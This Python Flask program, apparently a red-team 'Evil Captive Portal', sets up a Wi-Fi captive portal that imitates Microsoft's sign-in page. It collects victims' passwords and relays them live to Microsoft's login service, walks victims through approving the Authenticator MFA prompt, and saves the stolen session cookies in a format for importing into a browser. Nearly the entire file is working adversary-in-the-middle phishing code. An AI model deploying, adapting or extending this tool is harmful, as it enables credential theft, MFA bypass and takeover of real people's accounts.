#!/usr/bin/env python3
"""
Captive Portal fir Phisical Phising Scenerio - develeped by Shaked Weissman (as a part of ABI operations)

Github : htttp://github.com/Shkudw/EvilCaptive
"""
import threading
import secrets
import time
import json
import re
import html as _html
import sqlite3
import os
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from pathlib import Path

import requests as rq
from flask import Flask, request, jsonify, Response
from flask import send_from_directory
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

####################################################################################
SESSIONS: dict = {}
SESSIONS_LOCK = threading.Lock()
SESSION_TTL   = 600  
####################################################################################

def save_for_cookie_editor(cookies_dict, filename="cookies_for_browser.json"):

    formatted_cookies = []
    
    for name, value in cookies_dict.items():
        cookie_obj = {
            "domain": ".login.microsoftonline.com",
            "expirationDate": 1776534171,
            "hostOnly": False,
            "httpOnly": False,
            "name": name,
            "path": "/",
            "sameSite": "Lax",
            "secure": True,
            "session": True,
            "value": value
        }
        formatted_cookies.append(cookie_obj)
    
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(formatted_cookies, f, indent=4)
    
    print(f"[!] Cookies saved to {filename} - use Cookie-Editor :)")

####################################################################################
def _get_portal_host() -> str:
    try:
        return Path("/tmp/captive_portal_domain.txt").read_text().strip()
    except Exception:
        try:
            return Path("/tmp/captive_ap_ip.txt").read_text().strip()
        except:
            return "192.168.99.1"
####################################################################################
            
def session_get(sid: str) -> dict | None:
    with SESSIONS_LOCK:
        return SESSIONS.get(sid)

def session_set(sid: str, data: dict):
    with SESSIONS_LOCK:
        SESSIONS[sid] = data

def session_update(sid: str, **kwargs):
    with SESSIONS_LOCK:
        if sid in SESSIONS:
            SESSIONS[sid].update(kwargs)

####################################################################################
def _cleanup_sessions():
    while True:
        time.sleep(60)
        cutoff = time.time() - SESSION_TTL
        with SESSIONS_LOCK:
            to_delete = [sid for sid, s in SESSIONS.items()
                         if s.get("_created", 0) < cutoff]
            for sid in to_delete:
                del SESSIONS[sid]
        if to_delete:
            print(f"[CLEANUP] Removed {len(to_delete)} expired session(s)")

####################################################################################

threading.Thread(target=_cleanup_sessions, daemon=True).start()

DB_PATH = Path(__file__).parent / "access_log.db" # Try to Delete it every running....


SESSION_START_ID: int = 0
####################################################################################
#Writing DB:
def init_db():
    global SESSION_START_ID
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS access_log (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                username  TEXT    NOT NULL,
                ip        TEXT    NOT NULL,
                timestamp TEXT    NOT NULL,
                cookies   TEXT    NOT NULL,
                success   INTEGER NOT NULL DEFAULT 1
            )
        """)
        conn.commit()
        row = conn.execute("SELECT COALESCE(MAX(id), 0) FROM access_log").fetchone()
        SESSION_START_ID = row[0]
    print(f"[DB] Session watermark: id > {SESSION_START_ID} (ignoring older entries)")

####################################################################################

def log_access(username: str, ip: str, cookies: dict, success: bool = True):
    now = datetime.now(timezone.utc)
    ts_db = now.strftime("%Y-%m-%d %H:%M:%S UTC")
    ts_file = now.strftime("%Y%m%d_%H%M%S")
    
    editor_format = []
    for name, value in cookies.items():
        editor_format.append({
            "domain": ".login.microsoftonline.com",
            "hostOnly": False,
            "httpOnly": False,
            "name": name,
            "path": "/",
            "sameSite": "lax",
            "secure": True,
            "session": True,
            "value": value
        })

    cookie_filename = f"cookies_{username.split('@')[0]}_{ts_file}.json"
    with open(cookie_filename, "w", encoding="utf-8") as f:
        json.dump(editor_format, f, indent=4)

    cookies_simple_json = json.dumps(cookies, indent=4)

    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO access_log (username, ip, timestamp, success, cookies) VALUES (?,?,?,?,?)",
                (username, ip, ts_db, 1 if success else 0, cookies_simple_json)
            )
            conn.commit()
    except sqlite3.OperationalError:
        print(f"[WARN] Database error - check table structure.")

    log_line = f"[{ts_db}] {username} | {ip} | Import File: {cookie_filename}\n"
    with open("access_sessions.log", "a", encoding="utf-8") as f:
        f.write(log_line)

    print(f"[LOG] OK | {username} | Fixed JSON saved to: {cookie_filename}")


####################################################################################
####################################################################################

BASE_URL     = "https://login.microsoftonline.com"
OFFICE_LOGIN = "https://www.office.com/login"

BROWSER_HEADERS = {
    "User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept-Language":    "en-US,en;q=0.9",
    "Sec-Ch-Ua":          '"Not-A.Brand";v="24", "Chromium";v="146"',
    "Sec-Ch-Ua-Mobile":   "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
}

####################################################################################

def extract_config(html_text: str) -> dict:
    m = re.search(r'\$Config\s*=\s*(\{.+?\});', html_text, re.DOTALL)
    if not m:
        raise ValueError("$Config not found in HTML")
    return json.loads(m.group(1))

####################################################################################

def follow_bsso(sess: rq.Session, resp: rq.Response, referer="") -> rq.Response:
    for _ in range(4):
        try: cfg = extract_config(resp.text)
        except ValueError: break
        if cfg.get("hpgid") != 6 and "oPostParams" not in cfg: break
        url_post = cfg.get("urlPost", "")
        o_params = cfg.get("oPostParams", {})
        if not url_post or not o_params: break
        if url_post.startswith("/"): url_post = BASE_URL + url_post
        form = {k: _html.unescape(str(v)) for k, v in o_params.items()}
        resp = sess.post(url_post, headers={
            **BROWSER_HEADERS,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": BASE_URL, "Referer": referer or resp.url,
        }, data=form)
    return resp

####################################################################################

def run_auth_flow(sid: str, username: str, password: str, client_ip: str):
    sess  = rq.Session()

    try:
        import uuid as _uuid
        fake_guid = _uuid.uuid4().hex.upper()
        sess.cookies.set("brcap", "0",   domain=".login.microsoftonline.com", path="/")
        sess.cookies.set("MSFPC",
            f"GUID={fake_guid}&HASH={fake_guid[:4]}&LV=202504&V=4&LU=1749000000000",
            domain=".login.microsoftonline.com", path="/")

        sess.get(f"{BASE_URL}/", headers={**BROWSER_HEADERS,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},allow_redirects=False)

        r = sess.get(OFFICE_LOGIN, headers={**BROWSER_HEADERS,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},allow_redirects=False)

        oauth_url = r.headers.get("Location", "")
        if "login.microsoftonline.com" not in oauth_url:
            raise ValueError(f"Unexpected OAuth redirect: {oauth_url}")

        sess.get(oauth_url, headers={**BROWSER_HEADERS,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},allow_redirects=True)

        url4 = oauth_url + ("&" if "?" in oauth_url else "?") + "sso_reload=true"
        r4 = sess.get(url4, headers={**BROWSER_HEADERS,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Referer": oauth_url})

        req_id4 = r4.headers.get("X-Ms-Request-Id", "")
        cfg4 = extract_config(r4.text)

        c6 = {"api_canary": cfg4.get("apiCanary",""), 
            "canary": cfg4.get("canary",""),
            "flow_token": cfg4.get("sFT",""),
            "ctx": cfg4.get("sCtx",""),
            "request_id": req_id4, 
            "correlation_id": cfg4.get("correlationId","")
        }

        if not c6["flow_token"]: raise ValueError("No sFT in sign-in page $Config")

        r5 = sess.post(f"{BASE_URL}/common/GetCredentialType?mkt=en-US",
            headers={**BROWSER_HEADERS, "Accept": "application/json","Content-Type":"application/json; charset=UTF-8","Canary": c6["api_canary"], "Hpgrequestid": c6["request_id"],"Hpgid": "1104", "Hpgact": "1800","Client-Request-Id": c6["correlation_id"], "Origin": BASE_URL
            },

            json={"username": username, 
                    "isOtherIdpSupported": True, 
                    "checkPhones": False,
                    "isRemoteNGCSupported": True, 
                    "isCookieBannerShown": False,
                    "isFidoSupported": True, 
                    "originalRequest": c6["ctx"],
                    "country": "IL", 
                    "forceotclogin": False,
                    "isExternalFederationDisallowed": False, 
                    "isRemoteConnectSupported": False,
                    "federationFlags": 0, 
                    "isSignup": False, 
                    "flowToken": c6["flow_token"],
                    "isAccessPassSupported": True, 
                    "isQrCodePinSupported": True
                    }
                )
        
        d5 = r5.json()
        if d5.get("IfExistsResult") != 0:
            raise ValueError(f"Username not found (IfExistsResult={d5.get('IfExistsResult')})")
        cred = {"flow_token": d5["FlowToken"]}

        r6 = sess.post(f"{BASE_URL}/common/login", headers={**BROWSER_HEADERS,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Content-Type": "application/x-www-form-urlencoded","Origin": BASE_URL, "Referer": f"{BASE_URL}/"},
            data={"i13":"0",
                  "login":username,
                  "loginfmt":username,
                  "type":"11",
                  "LoginOptions":"3",
                  "lrt":"",
                  "lrtPartition":"",
                  "hisRegion":"",
                  "hisScaleUnit":"",
                  "passwd":password,
                  "ps":"2",
                  "psRNGCDefaultType":"",
                  "psRNGCEntropy":"",
                  "psRNGCSLK":"",
                  "canary":c6["canary"],
                  "ctx":c6["ctx"],
                  "hpgrequestid":c6["request_id"],
                  "flowToken":cred["flow_token"],
                  "PPSX":"",
                  "NewUser":"1",
                  "FoundMSAs":"",
                  "fspost":"0",
                  "i21":"0",
                  "CookieDisclosure":"0",
                  "IsFidoSupported":"1",
                  "isSignupPost":"0",
                  "DfpArtifact":"",
                  "i19":"21470"}
                )
        
        r6  = follow_bsso(sess, r6, referer=f"{BASE_URL}/common/login")
        req_id6 = r6.headers.get("X-Ms-Request-Id", "")
        cfg6 = extract_config(r6.text)
        url_cancel = cfg6.get("urlCancel","").replace("\\u0026","&")
        req_param  = parse_qs(urlparse(url_cancel).query).get("ctx",[""])[0] or cfg6.get("sCtx","")

        c30 = {"api_canary": cfg6.get("apiCanary",""),
                "canary": cfg6.get("canary",""),
               "flow_token": cfg6.get("sFT",""),
               "ctx": cfg6.get("sCtx",""),
               "request_id": req_id6, 
               "request_param": req_param
            }
        
        if not c30["flow_token"]: raise ValueError("No sFT after password – credentials wrong?")

        r7 = sess.post(f"{BASE_URL}/common/SAS/BeginAuth",
            headers={**BROWSER_HEADERS, "Accept": "application/json","Content-Type": "application/json; charset=UTF-8","Canary": c30["api_canary"], "Hpgrequestid": c30["request_id"],"Hpgid": "1114", "Hpgact": "2000", "Origin": BASE_URL,"Referer": f"{BASE_URL}/common/login"},
            json={"AuthMethodId": "PhoneAppNotification", 
                  "Method": "BeginAuth",
                  "ctx": c30["ctx"], 
                  "flowToken": c30["flow_token"]}
        ) 

        d7 = r7.json()
        if not d7.get("Success"): raise ValueError(f"BeginAuth failed: {d7}")
        begin = {"entropy": d7.get("Entropy"), 
                 "flow_token": d7.get("FlowToken",""),
                 "session_id": d7.get("SessionId",""), 
                 "ctx": d7.get("Ctx", c30["ctx"])
                }

        session_update(sid, mfa_number=begin["entropy"], state="waiting_mfa")

        flow_token = begin["flow_token"]
        poll_count = 0
        last_start = 0
        last_end   = 0
        MAX_POLLS  = 60

        while poll_count < MAX_POLLS:
            poll_count += 1
            t_start = int(time.time() * 1000)
            params  = {"authMethodId": "PhoneAppNotification", "pollCount": poll_count}
            if poll_count > 1:
                params["lastPollStart"] = last_start
                params["lastPollEnd"]   = last_end

            r8 = sess.get(f"{BASE_URL}/common/SAS/EndAuth",headers={**BROWSER_HEADERS, "Accept": "application/json","Content-Type": "application/json; charset=utf-8","Canary": c30["api_canary"], "Hpgrequestid": c30["request_id"],"Hpgid": "1114", "Hpgact": "2000","X-Ms-Ctx": c30["ctx"], "X-Ms-Flowtoken": flow_token,"X-Ms-Sessionid": begin["session_id"],"Origin": BASE_URL, "Referer": f"{BASE_URL}/common/login"},params=params)
            
            t_end = int(time.time() * 1000)
            d8 = r8.json()
            result_val = d8.get("ResultValue","")
            flow_token = d8.get("FlowToken", flow_token)
            last_start = t_start
            last_end = t_end

            if result_val == "Success":
                end_auth = {"flow_token": flow_token,"last_poll_start": t_start, "last_poll_end": t_end}
                break

            if result_val not in ("AuthenticationPending",""):
                raise ValueError(f"EndAuth error: {d8}")
            time.sleep(2)
        else:
            raise TimeoutError("MFA not approved in time")

 
        r9 = sess.post(f"{BASE_URL}/common/SAS/ProcessAuth",
            headers={**BROWSER_HEADERS,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Content-Type": "application/x-www-form-urlencoded","Origin": BASE_URL, "Referer": f"{BASE_URL}/common/login"},
            data={"type":"22",
                  "request":c30["request_param"],
                  "mfaLastPollStart":str(end_auth["last_poll_start"]),
                  "mfaLastPollEnd":str(end_auth["last_poll_end"]),
                  "mfaAuthMethod":"PhoneAppNotification",
                  "login":username,
                  "flowToken":end_auth["flow_token"],
                  "hpgrequestid":c30["request_id"],
                  "sacxt":"",
                  "hideSmsInMfaProofs":"false",
                  "canary":c30["canary"],
                  "i19":"7455"}
                )
        
        r9 = follow_bsso(sess, r9, referer=f"{BASE_URL}/common/SAS/ProcessAuth")
        captured_cookies = sess.cookies.get_dict()
        cfg9 = extract_config(r9.text)
        c46  = {"flow_token": cfg9.get("sFT",""), "ctx": cfg9.get("sCtx",""),"canary": cfg9.get("canary",""),"request_id": r9.headers.get("X-Ms-Request-Id","")}



        sess.post(f"{BASE_URL}/kmsi",
            headers={**BROWSER_HEADERS,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Content-Type": "application/x-www-form-urlencoded","Origin": BASE_URL, "Referer": f"{BASE_URL}/common/SAS/ProcessAuth"},
            data={"LoginOptions":"1",
                  "type":"28",
                  "ctx":c46["ctx"],
                  "hpgrequestid":c46["request_id"],
                  "flowToken":c46["flow_token"],
                  "canary":c46["canary"],
                  "i19":"2199"},
            allow_redirects=True)

        log_access(username, client_ip, captured_cookies, success=True)
        session_update(sid, state="approved", username=username)

    except Exception as exc:
        log_access(username, client_ip, success=False)
        session_update(sid, state="error", error_msg=str(exc))


####################################################################################

# iOS/macOS Apple:
APPLE_DETECT = [
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/bag",
]

# Android/Chrome:
ANDROID_DETECT = [
    "/generate_204",
    "/gen_204",
    "/connecttest.txt",
]

# Windows NCSI:
WINDOWS_DETECT = [
    "/ncsi.txt",
    "/redirect",
]

_NO_CACHE = {
    "Cache-Control": "no-cache, no-store, must-revalidate",
    "Pragma":        "no-cache",
    "Expires":       "0",
}

#####################################################################################

@app.route("/hotspot-detect.html") # iOS / macOS
@app.route("/library/test/success.html") # macOS
@app.route("/bag") # macOS
@app.route("/generate_204") # Android / Chrome
@app.route("/gen_204") # Android
@app.route("/connecttest.txt") # Windows
@app.route("/ncsi.txt")  # Windows NCSI
@app.route("/redirect") # Windows
@app.route("/cname.aspx") # Windows NCSI (msftncsi.com)
@app.route("/success.txt")# Android fallback
def captive_detect():
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ap_ip = _get_ap_ip()

    try:
        with sqlite3.connect(DB_PATH) as conn:
            row = conn.execute(
                "SELECT id FROM access_log "
                "WHERE ip=? AND success=1 AND id > ? "
                "ORDER BY id DESC LIMIT 1",
                (client_ip, SESSION_START_ID)
            ).fetchone()
        if row:
            return Response(
                "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
                status=200, mimetype="text/html", headers=_NO_CACHE
            )
    except Exception:
        pass
    portal_host = _get_portal_host()
    return Response("", status=302, headers={**_NO_CACHE,"Location": f"http://{portal_host}/portal",})


#####################################################################################
@app.route("/favicon.ico")
def silent_favicon():
    return Response("", status=204)
    
@app.route('/microsoft_logo.svg')
def get_logo():
    response = send_from_directory(os.getcwd(), "microsoft_logo.svg", mimetype='image/svg+xml')
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response
    
@app.route("/portal")
def portal_page():
    return Response(HTML_PORTAL, mimetype="text/html", headers=_NO_CACHE)

#####################################################################################

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def index(path=""):
    ap_ip = _get_ap_ip()
    return Response("", status=302, headers={
        **_NO_CACHE,
        "Location": f"http://{ap_ip}/portal",
    })

#####################################################################################
def _get_ap_ip() -> str:
    try:
        return Path("/tmp/captive_ap_ip.txt").read_text().strip()
    except Exception:
        return "192.168.99.1"

#####################################################################################
@app.route("/api/start", methods=["POST"])
def api_start():
    data     = request.get_json(force=True)
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    if not username or not password:
        return jsonify({"error": "Username and password are required"}), 400

    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    sid = secrets.token_hex(16)
    session_set(sid, {
        "state": "starting", "mfa_number": None,
        "username": username, "error_msg": None,
        "_created": time.time()
    })

    t = threading.Thread(
        target=run_auth_flow, args=(sid, username, password, client_ip), daemon=True)
    t.start()
    return jsonify({"sid": sid})

#####################################################################################

@app.route("/api/status")
def api_status():
    sid   = request.args.get("sid","")
    store = session_get(sid)
    if not store:
        return jsonify({"error": "Session not found"}), 404
    return jsonify({
        "state":      store["state"],
        "mfa_number": store["mfa_number"],
        "error_msg":  store.get("error_msg"),
    })

#####################################################################################

@app.route("/api/active")
def api_active():
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if not client_ip.startswith(("127.", "192.168.", "172.16.", "10.")):
        return "Forbidden", 403
    with SESSIONS_LOCK:
        active = [
            {"sid": sid[:8]+"...", "username": s.get("username",""),
             "state": s["state"], "mfa_number": s.get("mfa_number"),
             "age_sec": int(time.time() - s.get("_created", 0))}
            for sid, s in SESSIONS.items()
        ]
    return jsonify({"count": len(active), "sessions": active})

#####################################################################################

@app.route("/api/log")
def api_log():
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if not client_ip.startswith(("127.", "192.168.99.1")):
        return "Forbidden", 403
    rows = []
    with sqlite3.connect(DB_PATH) as conn:
        for row in conn.execute(
                "SELECT id,username,ip,timestamp,success FROM access_log ORDER BY id DESC LIMIT 200"):
            rows.append({"id":row[0],"username":row[1],"ip":row[2],"timestamp":row[3],"success":bool(row[4])})
    return jsonify(rows)


#####################################################################################
#####################################################################################
# claude helps me with this design also Gemini

HTML_PORTAL = """<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
  :root { --bg: #f3f2f1; --card: #ffffff; --border: #e1dfdd; --accent: #0078d4; --text: #201f1e; --muted: #605e5c; --link: #0067b8; }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, Arial, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
  
  .card { 
    background: var(--card); border: 1px solid var(--border); 
    border-radius: 2px; padding: 44px; 
    width: 100%; max-width: 440px; 
    box-shadow: 0 2px 6px rgba(0,0,0,.08); 
    position: relative; min-height: 540px;
  }
  
  .logo { margin-bottom: 20px; width: 140px; margin-left: -32px; } 
  .logo svg { display: block; width: 100%; height: auto; }

  h1 { font-size: 24px; font-weight: 600; margin-top: 16px; margin-bottom: 20px; color: #1b1b1b; }
  
  /* MFA Specific Styles */
  .mfa-email { font-size: 15px; color: #1b1b1b; margin-bottom: 4px; }
  .mfa-instruction-container { display: flex; align-items: flex-start; gap: 12px; margin-top: 24px; margin-bottom: 40px; }
  .mfa-icon { width: 32px; height: 32px; flex-shrink: 0; }
  .mfa-text { font-size: 15px; color: #1b1b1b; line-height: 1.4; }
  
  .mfa-number { 
    font-size: 80px; font-weight: 400; color: #323130; 
    text-align: center; margin-bottom: 60px; display: block;
  }

  .mfa-footer-text { font-size: 15px; color: #1b1b1b; margin-bottom: 28px; }
  .mfa-link { display: block; font-size: 14px; color: var(--link); text-decoration: none; margin-bottom: 16px; cursor: pointer; }
  .mfa-link:hover { text-decoration: underline; }

  /* Login Styles */
  .identity-display { display: flex; align-items: center; gap: 8px; font-size: 15px; margin-bottom: 20px; cursor: pointer; }
  .back-arrow { width: 16px; height: 16px; transform: scaleX(-1); }
  input { width: 100%; border: none; border-bottom: 1px solid #646464; padding: 7px 0; font-size: 16px; outline: none; margin-bottom: 20px; }
  input:focus { border-bottom: 2px solid var(--accent); }
  .btn { background: var(--accent); color: #fff; border: none; padding: 0 20px; height: 32px; font-size: 14px; font-weight: 400; cursor: pointer; min-width: 108px; }
  .btn-row { display: flex; justify-content: flex-end; margin-top: 20px; }

  .screen, .sub-step { display: none; }
  .active { display: block !important; }
</style>
</head>
<body>

<div class="card">
  <div class="logo">
	<svg width="100%" viewBox="0 0 680 200" role="img" xmlns="http://www.w3.org/2000/svg">
	  <title>Microsoft Logo</title>
	  <desc>Microsoft logo with four-color grid and wordmark</desc>
	  <rect x="160" y="52" width="46" height="46" fill="#F25022"/>
	  <rect x="209" y="52" width="46" height="46" fill="#7FBA00"/>
	  <rect x="160" y="101" width="46" height="46" fill="#00A4EF"/>
	  <rect x="209" y="101" width="46" height="46" fill="#FFB900"/>
	  <text x="270" y="128" font-family="'Segoe UI', Arial, sans-serif" font-size="80" font-weight="400" fill="#737373" letter-spacing="-0.5">Microsoft</text>
	</svg>
  </div>

  <div id="screen-login" class="screen active">
    <div id="step-user" class="sub-step active">
      <h1>Sign in</h1>
      <input type="text" id="username" placeholder="Email, phone, or Skype">
      <p style="font-size: 13px; margin-bottom: 20px;">No account? <span style="color:var(--link); cursor:pointer;">Create one!</span></p>
      <div class="btn-row"><button class="btn" onclick="goToPassword()">Next</button></div>
    </div>
    <div id="step-pass" class="sub-step">
      <div class="identity-display" onclick="goToUser()">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAMUlEQVQ4T2NkYGAwZmBgOMpAAsY0BEZDA8Y0BEZDA8Y0BEZDA8Y0BEZDA8Y0BEZDA8YIAIsfAAn7m9pEAAAAAElFTkSuQmCC" class="back-arrow">
        <span id="display-email"></span>
      </div>
      <h1>Enter password</h1>
      <input type="password" id="password" placeholder="Password">
      <div class="btn-row"><button class="btn" id="btn-final" onclick="startLogin()">Sign in</button></div>
    </div>
    <div id="login-err" class="err-box" style="display:none"></div>
  </div>

  <div id="screen-mfa" class="screen">
    <div class="mfa-email" id="mfa-display-email"></div>
    <h1>Approve sign in request</h1>
    
    <div class="mfa-instruction-container">
      <div class="mfa-icon">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 11C13.6569 11 15 9.65685 15 8C15 6.34315 13.6569 5 12 5C10.3431 5 9 6.34315 9 8C9 9.65685 10.3431 11 12 11Z" fill="#1b1b1b"/>
          <path d="M18 19C18 16.2386 15.3137 14 12 14C8.68629 14 6 16.2386 6 19" stroke="#1b1b1b" stroke-width="2" stroke-linecap="round"/>
          <circle cx="12" cy="12" r="11" stroke="#1b1b1b" stroke-width="2"/>
        </svg>
      </div>
      <div class="mfa-text">
        Open your Authenticator app and approve the request. Enter the number if prompted.
      </div>
    </div>

    <div class="mfa-number" id="mfa-number">—</div>

    <p class="mfa-footer-text">
      Didn't receive a sign-in request? <b>Swipe down to refresh</b> the content in your app.
    </p>

    <div class="mfa-link">I can't use my Microsoft Authenticator app right now</div>
    <div class="mfa-link">More information</div>
  </div>

  <div id="screen-ok" class="screen">
    <div style="font-size: 48px; text-align: center; margin-bottom: 24px;">✅</div>
    <h1 style="text-align: center; color: var(--green);">Connected</h1>
    <p style="text-align: center;">You have successfully verified your device.</p>
  </div>
</div>

<script>
let _sid = null;

function goToPassword() {
  const u = document.getElementById('username').value.trim();
  if(!u) return;
  document.getElementById('display-email').textContent = u;
  document.getElementById('mfa-display-email').textContent = u;
  document.getElementById('step-user').classList.remove('active');
  document.getElementById('step-pass').classList.add('active');
  document.getElementById('password').focus();
}

function goToUser() {
  document.getElementById('step-pass').classList.remove('active');
  document.getElementById('step-user').classList.add('active');
}

async function startLogin() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;
  const btn = document.getElementById('btn-final');
  if(!password) return;
  btn.disabled = true;
  try {
    const r = await fetch('/api/start', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({username, password})
    });
    const d = await r.json();
    if(d.error) throw new Error(d.error);
    _sid = d.sid;
    document.getElementById('screen-login').classList.remove('active');
    document.getElementById('screen-mfa').classList.add('active');
    pollStatus();
  } catch(e) {
    const err = document.getElementById('login-err');
    err.textContent = e.message; err.style.display='block';
    btn.disabled = false;
  }
}

function pollStatus() {
  setInterval(async () => {
    if(!_sid) return;
    try {
      const r = await fetch('/api/status?sid=' + _sid);
      const d = await r.json();
      if(d.mfa_number) document.getElementById('mfa-number').textContent = d.mfa_number;
      if(d.state === 'approved') {
        document.getElementById('screen-mfa').classList.remove('active');
        document.getElementById('screen-ok').classList.add('active');
        _sid = null;
      }
    } catch(e) {}
  }, 2000);
}
</script>
</body>
</html>
"""

##########################################################################################################

if __name__ == "__main__":
    init_db()
    print("\n  Evil Captive Portal - By Shkudw")
    print(f"  Access log:      {DB_PATH}")
    app.run(host="0.0.0.0", port=80, debug=False, threaded=True)
                                                                  
